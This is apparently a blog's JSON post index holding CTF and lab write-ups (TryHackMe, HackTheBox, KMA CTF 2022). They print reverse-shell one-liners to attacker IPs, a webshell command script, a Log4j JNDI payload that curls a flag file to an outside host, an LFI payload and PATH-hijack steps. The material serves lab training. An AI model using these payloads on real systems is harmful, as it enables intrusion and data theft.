[ { "title": "INFORMATION SECURITY HALL OF FAME", "url": "/posts/HALL-OF-FAME/", "categories": "HOF", "tags": "HOF", "date": "2022-09-02 13:30:00 +0530", "snippet": "Achievement PersonalUniversity of Cambridge Security Bug Acknowledgement 🌟🥳United Nations Information Security Hall of Fame 2022 🌟🥳CERT-EU Information Security Hall of Fame 2022 🌟🥳Avans Hogeschool ...", "content": "Achievement PersonalUniversity of Cambridge Security Bug Acknowledgement 🌟🥳United Nations Information Security Hall of Fame 2022 🌟🥳CERT-EU Information Security Hall of Fame 2022 🌟🥳Avans Hogeschool Security Bug Acknowledgement 🌟🥳ASUSTOR Information Security Hall of Fame 2022 🌟🥳Harvard University Security Bug Acknowledgement 🌟🥳" }, { "title": "Tryhackme Hacker Vs Hacker writeup", "url": "/posts/HackerVSHacker/", "categories": "THM", "tags": "THM", "date": "2022-08-16 01:30:00 +0530", "snippet": "Machine : Hacker Vs HackerWriteup status: Completed.EnumerationPort Scan Rustscan results└─[$] rustscan -t 2000 -a 10.10.33.194 -- -sC -sV ...", "content": "Machine : Hacker Vs HackerWriteup status: Completed.EnumerationPort Scan Rustscan results└─[$] rustscan -t 2000 -a 10.10.33.194 -- -sC -sV -----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------0day was here ♥[~] The config file is expected to be at \"/home/dragon/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. Open 10.10.33.194:22Open 10.10.33.194:80[~] Starting Script(s)[&gt;] Running script \"nmap -vvv -p -sC -sV\" on ip 10.10.33.194Depending on the complexity of the script, results may take some time to appear.[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 15:36 IST&lt;&lt;--SNIP--&gt;&gt;PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=| 256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=| 256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-title: RecruitSec: Industry Leading Infosec RecruitmentService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;&lt;--SNIP--&gt;&gt;ead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds There are 2 ports open 22 and 80HomepageDirectory Scanning&lt;Del&gt;└─[$] ffuf -u http://10.10.33.194/FUZZ -w ~/wordlists/directory/directory-list-2.3-medium.txt [15:46:18] /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0-dev________________________________________________ :: Method : GET :: URL : http://10.10.33.194/FUZZ :: Wordlist : FUZZ: /home/dragon/wordlists/directory/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 171ms]css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 139ms]cvs [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 138ms]dist [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 139ms]server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]:: Progress: [220560/220560] :: Job [1/1] :: 249 req/sec :: Duration: [0:17:29] :: Errors: 0 :: Seeing all those directory nothing found to be useful After uploading a pdf file in the upload section we can see the source code in intercepted request HTTP/1.1 200 OKDate: Tue, 16 Aug 2022 10:55:12 GMTServer: Apache/2.4.41 (Ubuntu)Vary: Accept-EncodingContent-Length: 552Connection: closeContent-Type: text/html; charset=UTF-8Hacked! If you dont want me to upload my shell, do better at filtering!&lt;!-- seriously, dumb stuff:$target_dir = \"cvs/\";$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);if (!strpos($target_file, \".pdf\")) { echo \"Only PDF CVs are accepted.\";} else if (file_exists($target_file)) { echo \"This CV has already been uploaded!\";} else if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"Success! We will get back to you.\";} else { echo \"Something went wrong :|\";}--&gt; I tried to upload a pdf file but it returned the same response which made me think that the hacker must have used the same technique to bypass the filteration and got the shell onto the servers, which means that the hacker has a shell/payload on the server which we can use and get a shell. As the server uses PHP and we saw the source code as well, the upload program uses strpos() so, as long the filename has .php in it we are good to go. I fuzzed the /cvs with guessing the extension .pdf.php gobuster results └─[$] gobuster dir -u http://10.10.117.45/cvs/ -w ~/wordlists/directory/directory-list-2.3-small.txt -x .pdf.php -t 50 ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.117.45/cvs/[+] Method: GET[+] Threads: 50[+] Wordlist: /home/dragon/wordlists/directory/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: pdf.php[+] Timeout: 10s===============================================================2022/08/16 16:55:10 Starting gobuster in directory enumeration mode===============================================================/shell.pdf.php (Status: 200) [Size: 18]Progress: 12400 / 175330 (7.07%) Progress: 12442 / 175330 (7.10%) ^C[!] Keyboard interrupt detected, terminating. =============================================================== shell.pdf.php seems intresting,└─[$] curl 10.10.117.45/cvs/shell.pdf.php &lt;pre&gt;&lt;/pre&gt;boom!% Just as I expected, this php file was used by the hackers to get shell on the servers. After trying for a while, i fount it uses cmd as it’s parameter └─[$] curl http://10.10.117.45/cvs/shell.pdf.php\\?cmd\\=id &lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/pre&gt;boom!% Voila we can now execute commands and get the user shell After trying to get revshell everytime the server send nope after we got a shell └─[$] nc -nvlp 9001 Connection from 10.10.117.45:52160$ whoaminoperead(net): Connection reset by peer└─[$] nc -nvlp 9001 Connection from 10.10.117.45:52162$ lsnope I developed a custom py exploit for temp shell till we get the user shell.import requestsurl = 'http://10.10.117.45/cvs/shell.pdf.php/?cmd='cmd = ''while(cmd != 'exit'): cmd = input('command&gt;') r = requests.get(url + cmd) print(r.text[5:-14], '\\n') After searching for a while i found lachlan's password in the .bash_history but unfortunately it gave same response nope.command&gt;cat /home/lachlan/.bash_history./cve.sh./cve-patch.shvi /etc/cron.d/persistenceecho -e \"dHY5pzmNYoETv7SUaY\\nthisistheway123\\nthisistheway123\" | passwdls -sf /dev/null /home/lachlan/.bash_history Trying to ssh└─[$] ssh lachlan@10.10.117.45 The authenticity of host '10.10.117.45 (10.10.117.45)' can't be established.ED25519 key fingerprint is SHA256:2RN2fsvo4NewQ4PV/D/U+gbDQND2ckUUnofzShfqqJk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.117.45' (ED25519) to the list of known hosts.lachlan@10.10.117.45's password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 16 Aug 2022 11:57:49 AM UTC System load: 0.24 Processes: 121 Usage of /: 25.6% of 9.78GB Users logged in: 0 Memory usage: 52% IPv4 address for eth0: 10.10.117.45 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Thu May 5 04:39:19 2022 from 192.168.56.1$ nopeConnection to 10.10.117.45 closed. let’s check out the file hackers might have edited that we noticed in the .bash_historycommand&gt;cat /etc/cron.d/persistencePATH=/home/lachlan/bin:/bin:/usr/bin# * * * * * root backup.sh* * * * * root /bin/sleep 1 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 11 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 21 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 31 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 41 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 51 &amp;&amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &gt; /dev/pts/$f &amp;&amp; pkill -9 -t pts/$f; done As you can see the cronjob runs after every 10 seconds and echo’s nope in /dev/pts what is /dev/pts? Consider as this file contains data of the current terminal For better understanding you can type tty in your current shell and type echo hello &gt; /dev/pts/&lt;shell_no&gt; in a new shell and you can see the hello on your current shell. Hmmmm, what next? Now as we can see the $PATH variable is declared inside the cron file… PATH=/home/lachlan/bin:/bin:/usr/bin So first the binaries will checkout in /home/lachlan/bin then /bin followed by /usr/binUser Shell As all the binary in the cronjob use absolute paht pkill is using relative path, that means if we create a binary named pkill in our home directory we can bypass it’s effects. Editing the pkill will get us a stable shell. └─[$] ssh lachlan@10.10.19.188 'echo \"hi\" &gt; ./bin/pkill &amp;&amp; chmod +x ./bin/pkill' lachlan@10.10.19.188's password: We can check if the file is created or not with out temp shell└─[$] python3 tempShell.pycommand&gt;ls -la /home/lachlan/bintotal 16drwxr-xr-x 2 lachlan lachlan 4096 Aug 16 13:56 .drwxr-xr-x 4 lachlan lachlan 4096 May 5 04:39 ..-rw-r--r-- 1 lachlan lachlan 56 May 5 04:38 backup.sh-rwxrwxr-x 1 lachlan lachlan 3 Aug 16 13:58 pkill command&gt;cat /home/lachlan/bin/pkillhi As we can see we have successfully edited the pkill Lets try for the shell└─[$] ssh lachlan@10.10.19.188 lachlan@10.10.19.188's password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 16 Aug 2022 02:01:14 PM UTC System load: 0.29 Processes: 126 Usage of /: 25.0% of 9.78GB Users logged in: 0 Memory usage: 48% IPv4 address for eth0: 10.10.19.188 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Thu May 5 04:39:19 2022 from 192.168.56.1$ bashlachlan@b2r:~$ lachlan@b2r:~$ iduid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)lachlan@b2r:~$ nopelachlan@b2r:~$ We still have echo nope but we the shell remains.Root shell As the pkill and other cronjob service runs after every 10 seconds with root privileges we can edit ./bin/pkill and get the root shell. Editing and adding revshell payload inside /home/lachlan/bin/pkill rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.237.225 4444 &gt;/tmp/f Start the netcat and wait for 10 seconds to get root shell Payloadlachlan@b2r:~/bin$ echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.237.225 4444 &gt;/tmp/f\" &gt; pkilllachlan@b2r:~/bin$ cat pkill rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.237.225 4444 &gt;/tmp/fShell We now get root shell on our netcat.└─[$] nc -nvlp 4444 Connection from 10.10.19.188:36670sh: 0: can't access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)# — MACHINE ROOTED —" }, { "title": "TryHackMe Overpass Walkthrough", "url": "/posts/Overpass/", "categories": "THM", "tags": "THM", "date": "2022-06-27 18:40:00 +0530", "snippet": "Overpass WriteupFrom TryhackmePort ScanDirectory ScanWeb Exploitation After seeing all the directories, /admin was most intresting to me Looking at the source code I found some intresting .js fil...", "content": "Overpass WriteupFrom TryhackmePort ScanDirectory ScanWeb Exploitation After seeing all the directories, /admin was most intresting to me Looking at the source code I found some intresting .js files login.js This piece of code has an vulnerability, it checks the response of the browser and if it doesn’t incorrect credentials,it redirect us to the /admin pageget admin privilege Intercept login request with burp suite and change the response to get admin panel Right click on the reques and &gt; Do intercept &gt; Request to this response This is the respose we get Updated response Admin homepageUser Shell we got username from admin panel, I’ve used john to crack the ssh password We successfully got a shellRoot shell I’ve used python server to get linpeas into the machine We have permission to write in /etc/hosts There’s a cronjob running on root service which basicallay uses curl and pipe it into bash We are going to change the content of /etc/hosts , adding our ip as overpass.thm First create files in your localhost Add a payload in buildscript.sh└─$ cat downloads/src/buildscript.sh #!/bin/bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.9.1.250 4444 &gt;/tmp/f Add your ip and port [ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc (IP) (PORT) &gt;/tmp/f ] Start a python3 server └─$ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.120.231 - - [02/Feb/2022 18:17:05] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 - Start netcat listener Wait around 1 minute to get root shell" }, { "title": "KMA CTF 2022", "url": "/posts/KMA-CTF/", "categories": "CTF", "tags": "CTF", "date": "2022-06-25 01:30:00 +0530", "snippet": "Mineme[+] Download SOURCE_CODE[+] Description of challenge The frist download MineCraft tlauncher Server game 149.28.135.96:13337Setup After downloading Tlaucher to run the game, you need to...", "content": "Mineme[+] Download SOURCE_CODE[+] Description of challenge The frist download MineCraft tlauncher Server game 149.28.135.96:13337Setup After downloading Tlaucher to run the game, you need to choose the correct version 1.15 as below, because the server is provided as server_1.15 Continue to the mutiplayer section to add your server or the author. To run the server in localhost, you can use the dockerfile that the author provides or runs files server_1.15.jar After running the file server_1.15.jar, the results will be. Server will be localhost: 25565Analysis After I opened the file server_1.15.jar with JD-GUI, it was quite shocked because too much class, because I never tried to see the server of Minecarft Code. Now that I go to read each class, it’s a bit tired, so I decided to go to Google to read some articles about Minecarft’s server. Because the description mentioned backdoor, I download another server on the internet, namely version 1.15.2 to DIFF. Command used diff by IntelliJ After surfing, there is no difference that is related to this challenge exploitation, only one thing is worth noting in the author’s file provided, with adding collection =&gt; may be related to Deserialize One more thing is that the Log4j vulnerability when public is available, the articles also mention Minecarft influenced by this vulnerability. So here I tried Trigger Log4J to see if it was successful. Try chat with payload Log4j then realize that there is a DNS return =&gt; The program has a log4j vulnerabilityExploitation If trigger was Log4j, I continued to need RCE to get the flag. I use JNDIExploit tool with Basic Queries, I can’t RCE. Above when I diff, there is collection =&gt; may be related to Deserialize. So in this tool has some part to create Payload with the Gadget. First, I tried with Payload URLDNS and CommonsCollectionsK1 /DNSLOG, I saw DNS to the domain, but when running with CommonsCollectionsK2 to RCE, it was not working again. I decided to fix the payload of CommonsCollectionsK1 fromldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Dnslog/ to ldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==[+] Run tool command Change your IP vps into red point Send payload to get flag ${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==} In 3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ== is curl -d @/flag http://suql4mat.requestrepo.com Challenge Pwned FLAG KMACTF{log4shell_go_bruh_bruh!!!} " }, { "title": "Hackthebox Backdoor Writeup", "url": "/posts/Backdoor_htb/", "categories": "HTB", "tags": "HTB", "date": "2022-04-23 00:00:00 +0530", "snippet": "Machine Name - BackdoorInitial EnumerationNmap Scan└─$ nmap -p- 1337,80,22 backdoor.htb -sC -sVStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 15:24 ISTNmap scan report for backdoor.htb (10.1...", "content": "Machine Name - BackdoorInitial EnumerationNmap Scan└─$ nmap -p- 1337,80,22 backdoor.htb -sC -sVStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 15:24 ISTNmap scan report for backdoor.htb (10.129.236.8)Host is up (0.34s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-Life1337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.00 secondsDirectory Listing└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10].htaccess [Status: 403, Size: 277, Words: 20, Lines: 10]server-status [Status: 403, Size: 277, Words: 20, Lines: 10]wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10]wp-content [Status: 301, Size: 317, Words: 20, Lines: 10]wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 :: The wp-admin directory lands you to a wordpress login page, I tried cracking the password with rockyou.txt but failed The wp-content directory had nothing, so I further ffuf it go see more directoires in itWp-content└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 277, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10]plugins [Status: 301, Size: 325, Words: 20, Lines: 10]themes [Status: 301, Size: 324, Words: 20, Lines: 10]upgrade [Status: 301, Size: 325, Words: 20, Lines: 10]uploads [Status: 301, Size: 325, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 :: The plugins directory is quiet intresting After messing around on web I found this exploit link : https://www.exploit-db.com/exploits/39575 Payload : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php Iniital Foothold I tried getting the id_rsa with LFI but the user directory didn’t have any ssh keys The port 1337 had ?waste service which nmap said ( NOTE : ?waste wasn’t the service running on port 1337 ) Let’s check what service that port had I read the man page for proc and found /cmdline intresting which tells sumary about a service Man page of proc : https://man7.org/linux/man-pages/man5/proc.5.html I didn’t found any exploits that shows services , so I made oneCheck Services Exploit.py import requestsurl = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='pl = []start = 900 # The service was on 956 for me, if you didn't found the service try changing the start pointfor i in range(start,1010): pl.append(f'{url}../../../../../../../../../../../../../../../proc/{i}/cmdline') for i in pl: r = requests.get(i) check = r.text if '1337' in check: print(check) print('SERVICE SUCCESSFULLY FOUND') break else: print(f'trying on /proc/{start}/cmdline') start+=1 Output.txt../../../../../../../../../../../../../../../proc/956/cmdline../../../../../../../../../../../../../../../proc/956/cmdline../../../../../../../../../../../../../../../proc/956/cmdline/bin/sh -c while true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done&lt;script&gt;window.close()&lt;/script&gt; So the port 1337 is running a gdbserver Link : https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/User Shell Use this msf exploit to get the user shell : use exploit/multi/gdb/gdb_server_execmsf6 exploit(multi/gdb/gdb_server_exec) &gt; set lhost 10.10.14.76lhost =&gt; 10.10.14.76msf6 exploit(multi/gdb/gdb_server_exec) &gt; set rhosts &lt;IP OF THE MACHINE&gt;msf6 exploit(multi/gdb/gdb_server_exec) &gt; set target 1target =&gt; 1msf6 exploit(multi/gdb/gdb_server_exec) &gt; set payload linux/x64/meterpreter/reverse_tcppayload =&gt; linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/gdb/gdb_server_exec) &gt; set rport 1337rport =&gt; 1337 Exploiting it gets us to &lt;meterpreter&gt; , to get a proper shell use shell command And we have the user shell python3 -c \"import pty;pty.spawn('/bin/bash')\"user@Backdoor:~$ ididuid=1000(user) gid=1000(user) groups=1000(user)user@Backdoor:~$ cat user.txt&lt;--SNIPPED--&gt;Privilege EscalationLinpeasroot 937 0.0 0.1 8356 3420 ? S 07:15 0:00 _ /usr/sbin/CRON -froot 954 0.0 0.0 2608 1596 ? Ss 07:15 0:02 _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec s The screen service is running at root privilegesRoot Shelluser@Backdoor:~$ /usr/bin/screen -h-h lines Set the size of the scrollback history buffer.-i Interrupt output sooner when flow control is on.-l Login mode on (update /var/run/utmp), -ln = off.-ls [match] or-list Do nothing, just list our SockDir [on possible matches].-L Turn on output logging.-Logfile file Set logfile name.-m ignore $STY variable, do create a new screen session.-O Choose optimal output rather than exact vt100 emulation.-p window Preselect the named window if it exists.-q Quiet startup. Exits with non-zero return code if unsuccessful.-Q Commands will send the response to the stdout of the querying process.-r [session] Reattach to a detached screen process.-R Reattach if possible, otherwise start a new session.-s shell Shell to execute rather than $SHELL.-S sockname Name this session &lt;pid&gt;.sockname instead of &lt;pid&gt;.&lt;tty&gt;.&lt;host&gt;.-t title Set title. (window's name).-T term Use term as $TERM for windows, rather than \"screen\".-U Tell screen to use UTF-8 encoding.-v Print \"Screen version 4.08.00 (GNU) 05-Feb-20\".-wipe [match] Do nothing, just clean up SockDir [on possible matches].-x Attach to a not detached screen. (Multi display mode).-X Execute &lt;cmd&gt; as a screen command in the specified session. So as there were no exploits available on the internet we have to play with the flags I tried to exploit with help of GTFO bins and some flags around here So we can get root shell with the -x flag : -x UserYouWannaHijackSession / HisSessionNamerootuser@Backdoor:~$ /usr/bin/screen -x root/root/usr/bin/screen -x root/rootroot@Backdoor:~# ididuid=0(root) gid=0(root) groups=0(root)root@Backdoor:~# cat /root/root.txt&lt;--SNIPPED--&gt; If you didn’t get the shell or some error like Please set a terminal type. use this command export TERM=xtermBox pwned" }, { "title": "Hackthebox Shibboleth Writeup", "url": "/posts/Shibboleth/", "categories": "HTB", "tags": "HTB", "date": "2022-04-09 01:30:00 +0530", "snippet": "Machine name - Shibboleth ( HackTheBox )Nmap Scan└─$ nmap -p- -sC -sV shibboleth.htbStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 09:37 ISTNmap scan report for shibboleth.htb (10.129.99.116...", "content": "Machine name - Shibboleth ( HackTheBox )Nmap Scan└─$ nmap -p- -sC -sV shibboleth.htbStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 09:37 ISTNmap scan report for shibboleth.htb (10.129.99.116)Host is up (0.20s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: FlexStart Bootstrap Template - IndexService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Hmmm only 1 port is opened, strange, Let’s try scanning UDP ports└─$ nmap -vvv -T4 -sU shibboleth.htbIncreasing send delay for 10.129.98.77 from 0 to 50 due to 11 out of 17 dropped probes since last increase.Warning: 10.129.98.77 giving up on port because retransmission cap hit (6).Increasing send delay for 10.129.98.77 from 200 to 400 due to 11 out of 14 dropped probes since last increase.Increasing send delay for 10.129.98.77 from 400 to 800 due to 11 out of 11 dropped probes since last increase.Nmap scan report for shibboleth.htb (10.129.98.77)Host is up, received echo-reply ttl 63 (0.21s latency).Scanned at 2021-11-14 00:50:23 EST for 1076sNot shown: 993 closed portsReason: 993 port-unreachesPORT STATE SERVICE REASON623/udp open asf-rmcp udp-response ttl 635555/udp open|filtered rplay no-response8000/udp open|filtered irdmi no-response21167/udp open|filtered unknown no-response30718/udp open|filtered unknown no-response49175/udp open|filtered unknown no-response49350/udp open|filtered unknown no-responseRead data files from: /usr/bin/../share/nmap# Nmap done at Sun Nov 14 01:08:19 2021 -- 1 IP address (1 host up) scanned in 1075.67 seconds…………and yess there are some udp ports openDirectory Scanning________________________________________________ :: Method : GET :: URL : http://zabbix.shibboleth.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 286, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 286, Words: 20, Lines: 10]app [Status: 301, Size: 328, Words: 20, Lines: 10]assets [Status: 301, Size: 331, Words: 20, Lines: 10]audio [Status: 301, Size: 330, Words: 20, Lines: 10]conf [Status: 301, Size: 329, Words: 20, Lines: 10]favicon.ico [Status: 200, Size: 32988, Words: 13, Lines: 3]fonts [Status: 301, Size: 330, Words: 20, Lines: 10]include [Status: 301, Size: 332, Words: 20, Lines: 10]js [Status: 301, Size: 327, Words: 20, Lines: 10]local [Status: 301, Size: 330, Words: 20, Lines: 10]locale [Status: 301, Size: 331, Words: 20, Lines: 10]modules [Status: 301, Size: 332, Words: 20, Lines: 10]robots.txt [Status: 200, Size: 974, Words: 153, Lines: 23]server-status [Status: 403, Size: 286, Words: 20, Lines: 10]vendor [Status: 301, Size: 331, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 328 req/sec :: Duration: [0:01:06] :: Errors: 0 ::After enumerating through these directories I found nothing that was intresting, let’s try getting some subdomainsSubdomain List└─$ ffuf -w /usr/share/wordlists/subdomains/subdomain-1million.txt -u http://shibboleth.htb/ -H \"Host: FUZZ.shibboleth.htb\" -mc 200 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ 